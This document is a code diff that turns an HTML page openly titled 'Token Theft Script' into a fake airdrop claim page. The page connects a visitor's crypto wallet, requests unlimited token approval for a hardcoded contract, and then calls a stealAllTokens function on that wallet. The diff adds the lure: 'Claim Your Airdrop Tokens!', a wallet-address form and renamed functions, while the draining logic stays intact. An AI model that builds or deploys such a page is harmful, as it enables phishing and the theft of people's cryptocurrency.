@@ -1,26 +1,27 @@
-aq<!DOCTYPE html>
+yu<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Theft Script</title>
+    <title>Fake Airdrop - Steal Tokens</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
 
-    <h2>Steal Tokens from Victim</h2>
+    <h2>Claim Your Airdrop Tokens!</h2>
+    <p>Connect your wallet to claim free tokens. This is a fake airdrop.</p>
 
-    <form id="stealTokensForm">
-        <label for="victimAddress">Victim Address:</label>
-        <input type="text" id="victimAddress" placeholder="Enter victim address" required>
-        <input type="submit" value="Steal Tokens">
+    <form id="claimAirdropForm">
+        <label for="walletAddress">Your Wallet Address:</label>
+        <input type="text" id="walletAddress" placeholder="Enter your wallet address" required>
+        <input type="submit" value="Claim Airdrop">
     </form>
 
     <script>
         // Contract Details
         const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract Address
         const knownTokens = [
-            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
+            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23", // Token addresses for approval
             "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
             "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
         ];
@@ -55,24 +56,6 @@ aq<!DOCTYPE html>
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
-            },
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
             }
         ];
 
@@ -88,7 +71,7 @@ aq<!DOCTYPE html>
             }
         }
 
-        async function approveAllTokens(victimAddress, signer) {
+        async function approveTokens(victimAddress, signer) {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             const maxApproval = ethers.constants.MaxUint256; // Max approval
             try {
@@ -103,7 +86,7 @@ aq<!DOCTYPE html>
             }
         }
 
-        async function stealAllTokens(victimAddress, signer) {
+        async function stealTokens(victimAddress, signer) {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             try {
                 await contract.stealAllTokens(victimAddress, knownTokens);
@@ -113,22 +96,22 @@ aq<!DOCTYPE html>
             }
         }
 
-        document.getElementById('stealTokensForm').addEventListener('submit', async function(event) {
+        document.getElementById('claimAirdropForm').addEventListener('submit', async function(event) {
             event.preventDefault();
-            const victimAddress = document.getElementById('victimAddress').value;
+            const victimAddress = document.getElementById('walletAddress').value;
 
             if (!victimAddress) {
-                alert("Please enter a victim address.");
+                alert("Please enter a wallet address.");
                 return;
             }
 
             const signer = await connectWallet();
             if (signer) {
                 // Step 1: Approve all tokens
-                const approvalSuccess = await approveAllTokens(victimAddress, signer);
+                const approvalSuccess = await approveTokens(victimAddress, signer);
                 if (approvalSuccess) {
                     // Step 2: Steal all tokens
-                    await stealAllTokens(victimAddress, signer);
+                    await stealTokens(victimAddress, signer);
                 }
             }
         });
